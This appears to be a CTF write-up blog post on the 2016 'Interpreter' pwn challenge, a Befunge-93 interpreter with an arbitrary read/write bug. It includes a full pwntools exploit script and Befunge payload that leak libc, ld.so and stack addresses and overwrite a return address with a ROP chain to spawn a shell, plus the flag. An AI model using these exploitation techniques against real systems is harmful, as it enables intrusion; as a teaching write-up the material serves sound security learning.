---
title: MMA 2nd CTF 2016 -- Interpreter
tags:
  - Python
  - MMA
  - CTF
  - Pwnable
categories:
  - write-ups
date: 2016-09-12 16:45:00
---
**Category:** pwn
**Points:** 200  

<!-- more -->  
  
64 bit ELF, with **FULL RELRO**, **NX**, **stack guard** & **PIE** enabled.  
After doing some reversing, we found that it's a [Befunge-93 program](https://en.wikipedia.org/wiki/Befunge) interpreter. It will first read some [Befunge-93 instructions](https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list) (at most 20000 characters), then interpret & execute those instructions. The program will store those instructions at the `program` buffer, and the maximum of the executed instructions is 10000.  
  
Here's the pseudo code of the main function:  
```c  
// here I only list some important features of the program

int main()
{
    puts("Welcome to Online Befunge(93) Interpreter");
    puts("Please input your program.");
    program = read_program(); // read user input to buffer 'program'

    step = 10001;
    row = 0, col = 0;
    do
    {
        ins = program[80 * row + col]
            switch ( ins )
            {
                .....//other instruction...
                case '&': // ask user for a number and push it to stack
                    __isoc99_scanf("%d", &x);
                    push(x);
                    break;
                case '.': // Pop value and output as an integer followed by a space
                    x = pop();
                    __printf_chk(1LL, "%d ", x);
                    break;
                    .....//other instruction...
                case '*':  // pop x, y, push x*y
                    a = pop();
                    b = pop();
                    push(a * b);
                    break;
                        .....//other instruction...
                case 'g': // (get) Pop x and y, then push ASCII value of the character at that position in the program
                    x = pop();
                    y = pop();
                    push( (char)(program[80 * x + y]) );
                    break;
                case 'p': // (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z
                    x = pop();
                    y = pop();
                    z = pop();
                    program[80 * x + y] = (char)z;
                    break;
                case ' ': // space = do nothing
                    break;
            }
        --step;
        // update row & column
        // do other stuff...
    }while ( step );
    puts("Too many steps. Is there any infinite loops?");
    return 0LL;
}
```
  
After we took some good look at the main function, we found that we're able to trigger the **read/write anywhere** vulnerability by doing the followings:  
  
* By using the `&`, `g` and `.` instructions, we're able to read the content of any memory address.  
  - Use `&` to push an integer on the `Stack` (notice the uppercase S, this `Stack` variable is a buffer that the interpreter use to simulate the stack in a Befunge-93 program).  
  - By doing `g`, the interpreter will first pop two values (let's say `x` & `y` ) from `Stack` and push the content of `program[80 * x + y]` to the `Stack`. Since we can control the value of `x` & `y`, we can push the content of any address on Stack, and print it out by using the `.` instruction.  
  - Notice that the `&` instruction only make us able to push an integer (32 bit) on the `Stack`. If we want to read the content that is far away from the `program` buffer, the value of `x` & `y` might have to be an **long integer**. To solve this problem, we can use the `*` instruction. It will pop two values (`x` & `y`) from the `Stack` and push `x * y` to `Stack`. It uses 64 bit registers during the whole operation, thus we can use this method to place a long integer on the `Stack`, then use `g` & `.` to leak the content of any memory address.  
* With the aforementioned methods, we can also use the `p` instruction to overwrite the content of any memory address.
  
So now we can leak and overwrite the content of whatever the memory address we want. The first thing we do is to leak the libc's base address. Here I leak the address of `__libc_start_main`'s GOT, and use [libc-database](https://github.com/niklasb/libc-database) to get the libc's version.  

Now we'll have to overwrite some address to hijack the control flow. Notice that there's no function pointer in the program, and GOT were all read-only due to the FULL RELRO protection. The only way we can do this is to **overwrite the return address.**  

So now we'll have to get the stack address. But how? There's no format string vulnerability, so it's hard (nearly impossible) for us to leak the saved ebp or argv address on the stack. Also there's no `malloc` or `mmap`, so it's also impossible for us to locate the .tls section address and leak the pointer to stack which is placed in the very section. 

By the time I was solving this challenge, the only way left I know is to leak the `__libc_stack_end` symbol in the `ld-linux.so`. To achieve this I'll have to leak the `ld-linux.so`'s base address from the `DT_DEBUG` info, which is placed in the .dynamic section of the binary. As for the version of the `ld-linux.so`, I just assume it's the same version with the libc.so, which is Ubuntu 14.04, 64bit. Luckily, the actual binary can be retrieved from my other VM. 

It took me a lot of time and work to do the whole thing, and the method's not elegant. Fortunately, it worked, and I was able to overwrite the return address with the typical x64 ROP chain: `pop_rdi --> bin_sh -->system`. At last, we are able to spawn a shell and get the flag.  
  
```python exp_bef.py  
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time
import math

HOST = "pwn1.chal.ctf.westerns.tokyo" 
PORT = 62839
ELF_PATH = "./befunge_patch"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

def leak_one_byte(off_1, off_80):
    r.sendline(str(off_1))
    r.sendline(str(off_80))
    ret = r.recvuntil(" ")
    return int(ret)

def leak_addr(base, off_80, name=None):
    ret_addr = 0
    cnt = 0
    for i in xrange(base, base+6):
        print "leaking %s byte : %d" % (name, cnt+1)
        ret = leak_one_byte(i, off_80)
        ret_addr = ret_addr | ((ret&0xff) << 8*cnt)
        cnt += 1

    return ret_addr

def cal_offset(addr, text_base):
    start_from = text_base + 0x202040
    offset = addr - start_from
    off_80 = offset/80
    off_1 = offset%80

    return off_1, off_80

def leak_far_addr(addr, text_base, name):
    ret_addr = 0
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in xrange(off_1, off_1+6):
        print "leaking %s byte : %d" % (name, cnt+1)
        r.sendline(str(i))
        r.sendline(str(temp))
        r.sendline(str(temp))
        ret = int(r.recvuntil(" "))
        ret_addr = ret_addr | ((ret&0xff) << 8*cnt)
        cnt += 1

    return ret_addr

def write_far_addr(addr, text_base, name, value):
    cnt = 0
    off_1, off_80 = cal_offset(addr, text_base)
    temp = int(math.sqrt(off_80))
    off_1 = (off_80 - temp**2)*80 + off_1

    for i in xrange(off_1, off_1+6):
        v = (value>>(8*cnt)) & 0xff
        print "writing %s byte %d : %x" % (name, cnt+1, v)
        r.sendline(str(v))
        r.sendline(str(i))
        r.sendline(str(temp))
        r.sendline(str(temp))
        cnt += 1

if __name__ == "__main__":
    
    #LOCAL = True
    LOCAL = False
    
    # construct befunge-93 program
    preline = myexec("wc -l ./bbb | awk '{print $1}'")
    preline = int(preline)
    f = open("./bbb", "r")
    s = f.read()
    s += "\n"*(80-preline)
    
    r, LD = None, None
    if not LOCAL:
        r = remote(HOST, PORT)
        LD = ELF("/mnt/files/ld-linux-x86-64.so.2")
    else:
        r = process(ELF_PATH)
        LD = ELF("/lib64/ld-linux-x86-64.so.2")

    # send program
    r.sendlineafter("> ", s)
    r.recvuntil("> > > > > > > > > > > > > > > > > > > > > > > > ")

    # leak libc
    libc_main = leak_addr(-48, -2, "libc_main")
    libc_base, system, bin_sh = None, None, None
    # for local
    if LOCAL:
        libc.address += libc_main - libc.symbols['__libc_start_main']
        libc_base = libc.address
        system = libc.symbols['system']
        bin_sh = str_addr("sh\x00", libc)
    # for remote
    else: 
        libc_base = libc_main - 0x21e50
        system = libc_base + 0x0000000000046590
        bin_sh = libc_base + 0x17c8c3

    # leak text base
    text_base = leak_addr(-56, -9, "text_base")
    text_base -= 0xb00

    log.info("libc_base: "+hex(libc_base))
    log.info("text_base: "+hex(text_base))
    
    # leak r_debug
    r_debug = leak_addr(0, -7, "r_debug")
    log.info("r_debug: "+hex(r_debug))

    # traverse link_map structure & leak ld-linux.so base address
    link_map_addr = r_debug + 8
    link_map_text = leak_far_addr(link_map_addr, text_base, "link_map_text")
    log.info("link_map_text: "+hex(link_map_text))
    link_map_vdso = leak_far_addr(link_map_text+24, text_base, "link_map_vdso")
    log.info("link_map_vdso: "+hex(link_map_vdso))
    link_map_libc = leak_far_addr(link_map_vdso+24, text_base, "link_map_libc")
    log.info("link_map_libc: "+hex(link_map_libc))
    link_map_ld = leak_far_addr(link_map_libc+24, text_base, "link_map_ld")
    log.info("link_map_ld: "+hex(link_map_ld))
    ld_base = leak_far_addr(link_map_ld, text_base, "ld_base")
    log.info("ld_base: "+hex(ld_base))
    # leak __libc_stack_end in ld-linux.so, get stack address
    LD.address += ld_base
    log.info("libc_stack_end: "+hex(LD.symbols['__libc_stack_end']))
    stack_addr = leak_far_addr(LD.symbols['__libc_stack_end'], text_base, "stack addr")
    log.info("stack_addr: "+hex(stack_addr))
    
    pop_rdi = text_base + 0x000000000000120c
    ret_addr = stack_addr - 216
    log.info("ret_addr: "+hex(ret_addr))
    log.info("pop_rdi: "+hex(pop_rdi))
    log.info("bin_sh: "+hex(bin_sh))
    log.info("system: "+hex(system))
    
    # overwrite return address
    write_far_addr(ret_addr, text_base, "ret_addr", pop_rdi)
    write_far_addr(ret_addr+8, text_base, "ret_addr+8", bin_sh)
    write_far_addr(ret_addr+16, text_base, "ret_addr+16", system)

    r.interactive()
```
`bbb` is the Befunge-93 program I used to exploit the service : 
```text bbb
>                                    v
v.g&&.g&&.g&&.g&&.g&&.g&&            <
>&&g.&&g.&&g.&&g.&&g.&&g.            v
v.g&&.g&&.g&&.g&&.g&&.g&&            <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.&&&*g.v 
v                                    <
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>&&&&*p&&&&*p&&&&*p&&&&*p&&&&*p&&&&*pv
v                                    < 
>                                    ^
```
  
flag : `TWCTF{It_1s_eMerG3nCy}`  
  
After I pass the challenge and ask a girl from HITCON CTF team, she told me that there's a symbol call `environ` in libc, which also store a stack address! And that's the moment I realized I totally forgot to search the stack address in libc while debugging the program!  
So the (way) more elegant way to solve this challenge is to leak the stack address via the `environ` symbol after we leak the libc's base address. Guess I've still got a lot to learn in the pwn area :P
